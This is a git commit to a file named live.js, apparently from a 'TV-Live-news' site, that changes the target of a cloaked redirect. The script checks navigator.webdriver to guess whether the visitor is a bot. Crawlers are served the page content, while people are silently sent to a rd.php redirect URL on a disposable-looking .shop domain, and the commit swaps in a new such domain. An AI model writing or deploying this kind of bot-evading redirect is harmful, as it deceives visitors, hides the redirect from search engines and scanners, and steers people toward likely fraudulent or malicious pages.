91451f1b1ba79a4777c51ff1be0d2119403e7d8f
TV-Live-news <mzgan5722@gmail.com>
2026-05-26 18:48:15 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://q4w7.shop/3/rd.php?url=/l/sn6GZkr86zo");
+  window.location.replace("https://n9m1.shop/3/rd.php?url=/p/IEyymEP");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
